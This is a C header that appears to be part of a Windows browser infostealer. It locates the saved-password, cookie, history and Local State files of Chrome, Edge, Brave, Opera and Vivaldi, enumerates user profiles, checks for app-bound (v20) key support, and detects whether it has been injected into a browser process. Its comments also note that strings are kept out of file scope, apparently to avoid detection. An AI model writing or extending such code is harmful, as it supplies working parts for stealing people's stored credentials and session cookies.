#pragma once
#ifndef BROWSER_DEFS_H
#define BROWSER_DEFS_H

// Browser type enum and data paths.
// Header only - every string is declared inside the function that uses it,
// no file scope constants, no global state.

#include "Common.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Browser Type Enum

typedef enum _BROWSER_TYPE
{
    BROWSER_UNKNOWN = -1,
    BROWSER_CHROME,
    BROWSER_BRAVE,
    BROWSER_EDGE,
    BROWSER_OPERA,
    BROWSER_OPERA_GX,
    BROWSER_VIVALDI,

    BROWSER_COUNT,

} BROWSER_TYPE;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// File paths

typedef enum _BROWSER_FILE_TYPE
{
    FILE_TYPE_WEB_DATA,
    FILE_TYPE_HISTORY,
    FILE_TYPE_COOKIES,
    FILE_TYPE_LOGIN_DATA,
    FILE_TYPE_BOOKMARKS,
    FILE_TYPE_LOCAL_STATE

} BROWSER_FILE_TYPE;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Getters - every string getter returns a heap-allocated copy (free with HeapFree)

static LPSTR GetBrowserName(IN BROWSER_TYPE Browser)
{
    CHAR    szName[BUFFER_SIZE_64]  = { 0 };

    if (Browser == BROWSER_CHROME)
        lstrcpyA(szName, "Chrome");
    else if (Browser == BROWSER_BRAVE)
        lstrcpyA(szName, "Brave");
    else if (Browser == BROWSER_EDGE)
        lstrcpyA(szName, "Edge");
    else if (Browser == BROWSER_OPERA)
        lstrcpyA(szName, "Opera");
    else if (Browser == BROWSER_OPERA_GX)
        lstrcpyA(szName, "OperaGX");
    else if (Browser == BROWSER_VIVALDI)
        lstrcpyA(szName, "Vivaldi");
    else
        lstrcpyA(szName, "Unknown");

    return DuplicateAnsiStringA(szName);
}

static LPSTR GetChromiumBrowserBasePath(IN BROWSER_TYPE Browser)
{
    CHAR    szBasePath[MAX_PATH]    = { 0 };
    BOOL    bFound                  = TRUE;

    if (Browser == BROWSER_CHROME)
        lstrcpyA(szBasePath, "Google\\Chrome\\User Data");
    else if (Browser == BROWSER_BRAVE)
        lstrcpyA(szBasePath, "BraveSoftware\\Brave-Browser\\User Data");
    else if (Browser == BROWSER_EDGE)
        lstrcpyA(szBasePath, "Microsoft\\Edge\\User Data");
    else if (Browser == BROWSER_OPERA)
        lstrcpyA(szBasePath, "Opera Software\\Opera Stable");
    else if (Browser == BROWSER_OPERA_GX)
        lstrcpyA(szBasePath, "Opera Software\\Opera GX Stable");
    else if (Browser == BROWSER_VIVALDI)
        lstrcpyA(szBasePath, "Vivaldi\\User Data");
    else
        bFound = FALSE;

    return bFound ? DuplicateAnsiStringA(szBasePath) : NULL;
}

static LPSTR GetChromiumFileSuffix(IN BROWSER_FILE_TYPE FileType)
{
    CHAR    szSuffix[MAX_PATH]  = { 0 };
    BOOL    bFound              = TRUE;

    if (FileType == FILE_TYPE_WEB_DATA)
        lstrcpyA(szSuffix, "Web Data");
    else if (FileType == FILE_TYPE_HISTORY)
        lstrcpyA(szSuffix, "History");
    else if (FileType == FILE_TYPE_COOKIES)
        lstrcpyA(szSuffix, "Network\\Cookies");
    else if (FileType == FILE_TYPE_LOGIN_DATA)
        lstrcpyA(szSuffix, "Login Data");
    else if (FileType == FILE_TYPE_BOOKMARKS)
        lstrcpyA(szSuffix, "Bookmarks");
    else if (FileType == FILE_TYPE_LOCAL_STATE)
        lstrcpyA(szSuffix, "Local State");
    else
        bFound = FALSE;

    return bFound ? DuplicateAnsiStringA(szSuffix) : NULL;
}

// Builds a browser-data-root relative path:
//   FILE_TYPE_LOCAL_STATE           -> "<base path>\Local State"            (root level, shared by all profiles)
//   everything else                 -> "<base path>\<profile>\<file suffix>" (profile level)
static BOOL GetChromiumBrowserFilePath(IN BROWSER_TYPE Browser, IN BROWSER_FILE_TYPE FileType, IN LPCSTR pszProfileName, OUT LPSTR pszBuffer, IN DWORD dwBufferSize)
{
    LPSTR   pszBasePath  = NULL;
    LPSTR   pszSuffix    = NULL;
    DWORD   dwNeeded     = 0x00;
    BOOL    bResult      = FALSE;

    pszBasePath  = GetChromiumBrowserBasePath(Browser);
    pszSuffix    = GetChromiumFileSuffix(FileType);

    if (!pszBasePath || !pszSuffix || !pszBuffer || dwBufferSize == 0)
        goto _END_OF_FUNC;

    dwNeeded = (DWORD)lstrlenA(pszBasePath) + 1 + (DWORD)lstrlenA(pszSuffix) + 1;

    if (FileType != FILE_TYPE_LOCAL_STATE)
    {
        if (!pszProfileName)
            goto _END_OF_FUNC;

        dwNeeded += (DWORD)lstrlenA(pszProfileName) + 1;
    }

    if (dwNeeded > dwBufferSize)
        goto _END_OF_FUNC;

    lstrcpyA(pszBuffer, pszBasePath);
    lstrcatA(pszBuffer, "\\");

    if (FileType != FILE_TYPE_LOCAL_STATE)
    {
        lstrcatA(pszBuffer, pszProfileName);
        lstrcatA(pszBuffer, "\\");
    }

    lstrcatA(pszBuffer, pszSuffix);

    bResult = TRUE;

_END_OF_FUNC:

    HEAP_FREE(pszBasePath);
    HEAP_FREE(pszSuffix);

    return bResult;
}

// Resolves the browser data root directory (e.g. ...\Google\Chrome\User Data)
// into a full path. Chrome/Brave/Edge/Vivaldi live under LOCALAPPDATA,
// Opera/Opera GX under APPDATA (Roaming) - so both roots are probed.
static BOOL BuildBrowserRootDirectory(IN BROWSER_TYPE Browser, OUT LPSTR pszBuffer, IN DWORD dwBufferSize)
{
    CHAR        szRoot[MAX_PATH]   = { 0 };
    LPCSTR      pszLocalAppData    = "LOCALAPPDATA";
    LPCSTR      pszAppData         = "APPDATA";
    DWORD       dwAttributes       = 0x00;
    LPSTR       pszRelPath         = NULL;

    if (!pszBuffer || dwBufferSize == 0)
        return FALSE;

    if (!(pszRelPath = GetChromiumBrowserBasePath(Browser)))
        return FALSE;

    if (GetEnvironmentVariableA(pszLocalAppData, szRoot, MAX_PATH))
    {
        wsprintfA(pszBuffer, "%s\\%s", szRoot, pszRelPath);

        if ((dwAttributes = GetFileAttributesA(pszBuffer)) != INVALID_FILE_ATTRIBUTES && (dwAttributes & FILE_ATTRIBUTE_DIRECTORY))
        {
            HEAP_FREE(pszRelPath);
            return TRUE;
        }
    }

    if (GetEnvironmentVariableA(pszAppData, szRoot, MAX_PATH))
    {
        wsprintfA(pszBuffer, "%s\\%s", szRoot, pszRelPath);

        if ((dwAttributes = GetFileAttributesA(pszBuffer)) != INVALID_FILE_ATTRIBUTES && (dwAttributes & FILE_ATTRIBUTE_DIRECTORY))
        {
            HEAP_FREE(pszRelPath);
            return TRUE;
        }
    }

    HEAP_FREE(pszRelPath);
    return FALSE;
}

// Enumerates the user profile directories inside the browser data root.
// A directory counts as a profile when it holds a "Preferences" file;
// "System Profile" and "Guest Profile" are skipped. When nothing is found
// the fallback is a single "Default" entry.
// pszProfiles points to dwMaxProfiles consecutive buffers of
// dwProfileBufferSize chars each. Returns the profile count.
static DWORD EnumerateBrowserProfiles(IN BROWSER_TYPE Browser, OUT LPSTR pszProfiles, IN DWORD dwMaxProfiles, IN DWORD dwProfileBufferSize)
{
    CHAR                szRoot[MAX_PATH]     = { 0 };
    CHAR                szPattern[MAX_PATH]  = { 0 };
    CHAR                szCandidate[MAX_PATH] = { 0 };
    WIN32_FIND_DATAA    FindData             = { 0 };
    HANDLE              hFind                = INVALID_HANDLE_VALUE;
    LPSTR               pszSlot              = NULL;
    DWORD               dwCount              = 0x00;

    if (!pszProfiles || dwMaxProfiles == 0 || dwProfileBufferSize == 0)
        return 0;

    if (!BuildBrowserRootDirectory(Browser, szRoot, MAX_PATH))
        return 0;

    wsprintfA(szPattern, "%s\\*", szRoot);

    if ((hFind = FindFirstFileA(szPattern, &FindData)) == INVALID_HANDLE_VALUE)
        return 0;

    do
    {
        if (!(FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            continue;

        if (lstrcmpA(FindData.cFileName, ".") == 0 || lstrcmpA(FindData.cFileName, "..") == 0)
            continue;

        // Not user data profiles
        if (lstrcmpiA(FindData.cFileName, "System Profile") == 0 || lstrcmpiA(FindData.cFileName, "Guest Profile") == 0)
            continue;

        // Profile marker: a "Preferences" file inside the directory
        wsprintfA(szCandidate, "%s\\%s\\Preferences", szRoot, FindData.cFileName);

        if (!FileExistsA(szCandidate))
            continue;

        pszSlot = (LPSTR)((PBYTE)pszProfiles + (dwCount * dwProfileBufferSize));
        lstrcpyA(pszSlot, FindData.cFileName);
        dwCount++;

    } while (dwCount < dwMaxProfiles && FindNextFileA(hFind, &FindData));

    FindClose(hFind);

    // Fallback when no profile directory was detected
    if (dwCount == 0 && dwMaxProfiles > 0)
    {
        lstrcpyA((LPSTR)((PBYTE)pszProfiles + 0), "Default");
        dwCount = 1;
    }

    return dwCount;
}

// Resolves a browser-relative path into a full path. Chrome/Brave/Edge/Vivaldi
// live under LOCALAPPDATA, Opera/Opera GX under APPDATA (Roaming) - so both
// roots are probed. Only returns a path when the file actually exists.
static BOOL BuildBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath, OUT LPSTR pszBuffer, IN DWORD dwBufferSize)
{
    CHAR        szRoot[MAX_PATH]   = { 0 };
    LPSTR       pszBasePath        = NULL;
    LPCSTR      pszLocalAppData    = "LOCALAPPDATA";
    LPCSTR      pszAppData         = "APPDATA";
    BOOL        bValidBrowser      = FALSE;

    // Validate the browser type through its base path getter
    if ((pszBasePath = GetChromiumBrowserBasePath(Browser)) != NULL)
    {
        HEAP_FREE(pszBasePath);
        bValidBrowser = TRUE;
    }

    if (!bValidBrowser || !pszRelPath || !pszBuffer || dwBufferSize == 0)
        return FALSE;

    if (GetEnvironmentVariableA(pszLocalAppData, szRoot, MAX_PATH))
    {
        wsprintfA(pszBuffer, "%s\\%s", szRoot, pszRelPath);
        if (FileExistsA(pszBuffer))
            return TRUE;
    }

    if (GetEnvironmentVariableA(pszAppData, szRoot, MAX_PATH))
    {
        wsprintfA(pszBuffer, "%s\\%s", szRoot, pszRelPath);
        if (FileExistsA(pszBuffer))
            return TRUE;
    }

    return FALSE;
}

// Browser detection for the standalone EXE: a browser counts as installed
// when its "Local State" file exists in the expected data root.
static BOOL IsBrowserDataPresent(IN BROWSER_TYPE Browser)
{
    CHAR szRelPath[MAX_PATH]   = { 0 };
    CHAR szFullPath[MAX_PATH]  = { 0 };

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, NULL, szRelPath, MAX_PATH))
        return FALSE;

    return BuildBrowserDataFilePath(Browser, szRelPath, szFullPath, MAX_PATH);
}

// Browsers that do not ship the app-bound (v20) elevation service.
static BOOL BrowserSupportsV20Key(IN BROWSER_TYPE Browser)
{
    return (Browser == BROWSER_CHROME || Browser == BROWSER_EDGE || Browser == BROWSER_BRAVE) ? TRUE : FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Browser context detection (ported from the original DllMain.cpp)

// Case-insensitive ANSI substring search (replaces StrStrIA, no shlwapi).
static BOOL LocalContainsIA(IN LPCSTR pszHaystack, IN LPCSTR pszNeedle)
{
    DWORD   cchHaystack = 0x00,
            cchNeedle   = 0x00;

    if (!pszHaystack || !pszNeedle)
        return FALSE;

    cchHaystack = (DWORD)lstrlenA(pszHaystack);
    cchNeedle   = (DWORD)lstrlenA(pszNeedle);

    if (cchNeedle == 0 || cchNeedle > cchHaystack)
        return FALSE;

    for (DWORD i = 0; (i + cchNeedle) <= cchHaystack; i++)
    {
        DWORD j = 0;
        CHAR   cLeft = 0x00,
               cRight = 0x00;

        while (j < cchNeedle)
        {
            cLeft   = pszHaystack[i + j];
            cRight  = pszNeedle[j];

            if (cLeft >= 'A' && cLeft <= 'Z')
                cLeft += 32;
            if (cRight >= 'A' && cRight <= 'Z')
                cRight += 32;

            if (cLeft != cRight)
                break;

            j++;
        }

        if (j == cchNeedle)
            return TRUE;
    }

    return FALSE;
}

// Identifies the browser this process lives inside (injected DLL case) by
// matching the running image name. Returns BROWSER_UNKNOWN for a standalone
// process that is not one of the supported browsers.
static BROWSER_TYPE DetectBrowserFromProcess(VOID)
{
    CHAR        szModulePath[MAX_PATH]  = { 0 };
    LPCSTR      pszFileName             = NULL;
    const CHAR  szBrave[]               = "Brave";
    const CHAR  szMsedge[]              = "Msedge";
    const CHAR  szEdge[]                = "Edge";
    const CHAR  szOperaGxAlt[]          = "Opera GX";
    const CHAR  szOperaGx[]             = "OperaGX";
    const CHAR  szOpera[]               = "Opera";
    const CHAR  szVivaldi[]             = "Vivaldi";
    const CHAR  szChrome[]              = "Chrome";

    if (!GetModuleFileNameA(NULL, szModulePath, MAX_PATH))
        return BROWSER_UNKNOWN;

    pszFileName = PathFindFileNameLocalA(szModulePath);

    if (LocalContainsIA(pszFileName, szBrave))
        return BROWSER_BRAVE;
    else if (LocalContainsIA(pszFileName, szMsedge) || LocalContainsIA(pszFileName, szEdge))
        return BROWSER_EDGE;
    else if (LocalContainsIA(szModulePath, szOperaGxAlt) || LocalContainsIA(szModulePath, szOperaGx))
        return BROWSER_OPERA_GX;
    else if (LocalContainsIA(pszFileName, szOpera))
        return BROWSER_OPERA;
    else if (LocalContainsIA(pszFileName, szVivaldi))
        return BROWSER_VIVALDI;
    else if (LocalContainsIA(pszFileName, szChrome))
        return BROWSER_CHROME;

    return BROWSER_UNKNOWN;
}

#endif // !BROWSER_DEFS_H
